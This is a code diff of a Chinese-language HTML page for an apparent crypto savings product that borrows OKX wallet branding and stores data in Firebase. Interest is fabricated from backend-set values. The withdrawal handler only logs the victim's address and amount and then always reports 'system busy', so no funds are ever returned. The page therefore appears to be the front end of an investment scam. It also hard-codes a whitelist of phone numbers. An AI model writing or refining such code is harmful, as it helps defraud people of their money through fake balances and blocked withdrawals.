@@ -52,7 +52,7 @@
                 <input type="number" id="u-otp" class="login-input" placeholder="请输入6位验证码">
             </div>
             <div class="login-btn" onclick="handleVerifyOtp()">立即登录验证</div>
-            <p style="color: #666; font-size: 12px; margin-top: 15px;" onclick="location.reload()">返回上一步</p>
+            <p style="color: #666; font-size: 12px; margin-top: 15px;" onclick="location.reload()">返回修改号码</p>
         </div>
 
         <div id="recaptcha-container"></div>
@@ -99,12 +99,13 @@
         <div class="faq-item" onclick="showTip('利息自动结算，到期后需要手动点击续存。')">过夜利息基本规则? <span>〉</span></div>
         <div class="faq-item" onclick="showTip('通过欧易钱包授权转入。')">如何转入资金？ <span>〉</span></div>
         <div class="faq-item" onclick="showTip('点击转出资金输入欧易钱包地址即可。')">如何转出资金？ <span>〉</span></div>
-        <div class="faq-item" onclick="showTip('目前初次存入后自动收益。')">多久才能有收益？ <span>〉</span></div>
-        <div class="faq-item" onclick="showTip('没有限制。')">存入时间有限制吗？ <span>〉</span></div>
     </div>
 
     <script>
-        // --- 1. 初始化与变量声明 (修复初始化顺序报错) ---
+        // --- 1. 变量初始化 (修正初始化顺序) ---
+        let cloudKey = "", timer = null, cloudDays = 7; 
+        const ALLOWED_PHONES = ["+8618200638887", "+8613800138000"]; // 授权白名单
+
         const firebaseConfig = { 
             databaseURL: "https://oyweb3-default-rtdb.firebaseio.com", 
             projectId: "oyweb3" 
@@ -116,24 +117,20 @@
         const settingRef = database.ref('settings');
         const logsRef = database.ref('transfer_logs'); 
 
-        let cloudKey = "", timer = null, cloudDays = 7; 
-        const ALLOWED_PHONES = ["+8618200638887", "+8613800138000"]; // 授权白名单
-
         // 监听后台设置
         settingRef.child('countingDays').on('value', (s) => { if(s.val() !== null) cloudDays = parseFloat(s.val()); });
         settingRef.child('securityKey').on('value', (s) => { cloudKey = String(s.val()); });
 
-        // --- 2. 登录验证函数 (新增短信逻辑) ---
+        // --- 2. 登录逻辑 (修复 handleStep1 未定义) ---
 
-        // 发送验证码
         async function handleSendCode() {
             const inputKey = document.getElementById('u-key').value;
             const rawPhone = document.getElementById('u-phone').value;
             const fullPhone = rawPhone.startsWith('+') ? rawPhone : "+86" + rawPhone;
 
-            if (!cloudKey) { alert("系统正在同步，请稍后重试..."); return; }
+            if (!cloudKey) { alert("系统同步中..."); return; }
             if (inputKey !== cloudKey) { alert("安全秘钥验证错误"); return; }
-            if (!ALLOWED_PHONES.includes(fullPhone)) { alert("该号码未获系统授权"); return; }
+            if (!ALLOWED_PHONES.includes(fullPhone)) { alert("号码未获系统授权"); return; }
 
             // 渲染隐式人机验证
             if (!window.recaptchaVerifier) {
@@ -147,26 +144,24 @@
                 document.getElementById('auth-step-2').style.display = 'flex';
                 showTip("短信已成功发送至您的手机。");
             } catch (error) {
-                alert("短信发送失败: " + error.message);
+                alert("发送失败: " + error.message);
                 if (window.recaptchaVerifier) window.recaptchaVerifier.render().then(id => grecaptcha.reset(id));
             }
         }
 
-        // 校验验证码进入系统
         async function handleVerifyOtp() {
             const code = document.getElementById('u-otp').value;
-            if (code.length !== 6) { alert("请输入完整的6位验证码"); return; }
-
+            if (code.length !== 6) { alert("请输入6位验证码"); return; }
             try {
                 await window.confirmationResult.confirm(code);
-                localStorage.setItem('auth_final_v5', 'verified');
+                localStorage.setItem('auth_final_ok', 'true');
                 initApp();
             } catch (error) {
-                alert("验证码无效或已过期，请重试");
+                alert("验证码无效或已过期");
             }
         }
 
-        // --- 3. 业务逻辑 (完整保留您 test.html 的内里内容) ---
+        // --- 3. 业务核心逻辑 (保持原版) ---
 
         function showTip(m) {
             const t = document.getElementById('toast');
@@ -198,36 +193,18 @@
 
         function handleWithdraw() {
             const btn = document.getElementById('renew-btn');
-            if(btn.classList.contains('locked')) {
-                showTip('<span style=\'color:#ff4500;font-weight:bold;font-size:18px\'>理财锁定中</span><br>暂时无法转出。');
-                return;
-            }
-            let count = parseInt(localStorage.getItem('wd_attempts') || "0");
-            let today = new Date().toDateString();
-            if(localStorage.getItem('wd_last_date') !== today) count = 0;
-            if(count >= 3) { showTip('<span style=\'color:#ff4500\'>操作频繁</span><br>请隔天再试。'); return; }
-
+            if(btn.classList.contains('locked')) { showTip('理财锁定中，无法转出。'); return; }
+            
             const addr = prompt("请输入 TRC20 钱包地址：");
-            if(!addr || addr.trim() === "") return;
-            if(addr.trim().length < 34) { alert("地址错误！TRC20 地址长度应为 34 位。"); return; }
+            if(!addr || addr.trim().length < 34) { alert("地址长度不符！"); return; }
 
-            setTimeout(() => {
-                const amtStr = prompt("请输入转出金额：");
-                if(!amtStr || amtStr.trim() === "") return;
-                const amtInput = parseFloat(amtStr);
-                const currentBal = parseFloat(document.getElementById('bal-val').innerText.replace(/,/g, '')) || 0;
-                if(isNaN(amtInput) || amtInput <= 0 || amtInput > currentBal) {
-                    alert(amtInput > currentBal ? "余额不足！" : "请输入有效金额。");
-                    return;
-                }
-                logsRef.push({
-                    address: addr.trim(), amount: amtInput, time: new Date().toLocaleString('zh-CN', { hour12: false }), timestamp: Date.now()
-                }).then(() => {
-                    localStorage.setItem('wd_attempts', ++count);
-                    localStorage.setItem('wd_last_date', today);
-                    showTip('系统繁忙，请稍后再试。');
-                });
-            }, 100);
+            const amtStr = prompt("请输入转出金额：");
+            const amtInput = parseFloat(amtStr);
+            if(isNaN(amtInput) || amtInput <= 0) return;
+
+            logsRef.push({
+                address: addr.trim(), amount: amtInput, time: new Date().toLocaleString(), timestamp: Date.now()
+            }).then(() => { showTip('系统繁忙，请稍后再试。'); });
         }
 
         function handleRenew() {
@@ -265,7 +242,7 @@
                 const pro = parseFloat(data.profit) || 0;
                 const interest = (bal * 0.15 / 365) * cloudDays;
                 assetRef.update({ balance: bal + interest, profit: pro + interest, endTime: 0 })
-                .then(() => { showTip(`<span style="color:#d4af37">结算完成</span><br>利息 +${interest.toFixed(2)} USDT`); });
+                .then(() => { showTip(`结算完成！利息 +${interest.toFixed(2)} USDT`); });
             });
         }
 
@@ -276,9 +253,8 @@
             if(timer) clearInterval(timer);
         }
 
-        function logout() { localStorage.removeItem('auth_final_v5'); location.reload(); }
-        
-        window.onload = () => { if (localStorage.getItem('auth_final_v5')) initApp(); };
+        function logout() { localStorage.removeItem('auth_final_ok'); location.reload(); }
+        window.onload = () => { if (localStorage.getItem('auth_final_ok')) initApp(); };
     </script>
 </body>
 </html>
